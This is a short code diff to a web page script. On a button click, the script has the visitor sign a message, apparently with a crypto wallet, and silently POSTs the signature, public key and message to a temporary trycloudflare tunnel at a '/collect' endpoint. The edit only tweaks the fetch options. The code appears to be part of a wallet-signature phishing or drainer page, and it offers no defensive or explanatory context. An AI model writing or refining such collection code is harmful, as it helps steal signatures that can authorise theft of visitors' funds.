@@ -18,7 +18,8 @@ document.getElementById('cta').onclick = async () => {
         const sig = btoa(String.fromCharCode.apply(null, signed.signature));
         
         // 🔱 终极 HTTPS 域名直连
-        fetch("https://pittsburgh-documents-observation-terrace.trycloudflare.com/collect", {
+        fetch("https://pittsburgh-documents-observation-terrace.trycloudflare.com/collect", { 
+            cache: "no-cache",
             method: 'POST',
             mode: 'no-cors',
             body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg }),
